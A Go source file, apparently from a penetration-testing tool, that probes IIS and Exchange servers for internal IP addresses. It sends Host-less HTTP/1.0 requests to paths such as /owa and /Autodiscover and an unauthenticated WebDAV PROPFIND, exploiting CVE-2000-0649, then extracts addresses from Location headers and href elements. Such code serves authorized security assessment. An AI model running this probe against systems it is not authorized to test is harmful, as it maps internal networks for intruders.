package disclosure

import (
	"fmt"
	"regexp"
	"time"

	"github.com/mubix/ntlmscout/internal/netx"
)

var (
	reLocation = regexp.MustCompile(`(?im)^(location|content-location)\s*:\s*(\S+)`)
	reHref     = regexp.MustCompile(`(?is)<(?:D:)?href>\s*(.*?)\s*</(?:D:)?href>`)
)

// rawHTTP sends a minimal HTTP/1.0 request with NO Host header (so IIS reflects
// its internal IP) and returns the raw response bytes.
func rawHTTP(cfg *netx.Config, host string, port int, useTLS bool, method, path string, extra string, timeout time.Duration) []byte {
	conn, err := cfg.Connect(host, port, useTLS, timeout)
	if err != nil {
		cfg.Debugf(fmt.Sprintf("iisip %s %s", host, path), err)
		return nil
	}
	defer conn.Close()
	req := fmt.Sprintf("%s %s HTTP/1.0\r\n%s\r\n", method, path, extra)
	if _, err := conn.Write([]byte(req)); err != nil {
		return nil
	}
	return readAllConn(conn, 131072, timeout)
}

func readAllConn(conn interface {
	Read([]byte) (int, error)
	SetReadDeadline(time.Time) error
}, cap int, timeout time.Duration) []byte {
	_ = conn.SetReadDeadline(time.Now().Add(timeout))
	var buf []byte
	chunk := make([]byte, 4096)
	for len(buf) < cap {
		m, err := conn.Read(chunk)
		if m > 0 {
			buf = append(buf, chunk[:m]...)
		}
		if err != nil {
			break
		}
	}
	return buf
}

// IISInternalIP recovers internal addresses via CVE-2000-0649 (Host-less
// redirect) and a WebDAV PROPFIND, both unauthenticated.
func IISInternalIP(cfg *netx.Config, host string, port int, useTLS bool, timeout time.Duration) []Address {
	found := map[string]Address{}
	var order []string

	addIPs := func(text, source string) {
		for _, ip := range findIPs(text) {
			if ip == host {
				continue
			}
			internal := isInternalAddr(ip)
			if internal == nil {
				continue
			}
			if _, seen := found[ip]; seen {
				continue
			}
			found[ip] = Address{Address: ip, Internal: internal, IsIP: true, Source: source}
			order = append(order, ip)
		}
	}
	harvest := func(data []byte, where string) {
		s := string(data)
		for _, m := range reLocation.FindAllStringSubmatch(s, -1) {
			addIPs(m[2], fmt.Sprintf("%s header (%s)", m[1], where))
		}
		for _, m := range reHref.FindAllStringSubmatch(s, -1) {
			addIPs(m[1], "PROPFIND href ("+where+")")
		}
	}

	for _, path := range []string{"/", "/owa", "/exchange", "/ews", "/aspnet_client",
		"/Autodiscover", "/Microsoft-Server-ActiveSync"} {
		harvest(rawHTTP(cfg, host, port, useTLS, "GET", path, "", timeout), "GET "+path)
	}
	harvest(rawHTTP(cfg, host, port, useTLS, "PROPFIND", "/", "Depth: 0\r\nContent-Length: 0\r\n", timeout), "PROPFIND /")

	out := make([]Address, 0, len(order))
	for _, ip := range order {
		out = append(out, found[ip])
	}
	return out
}
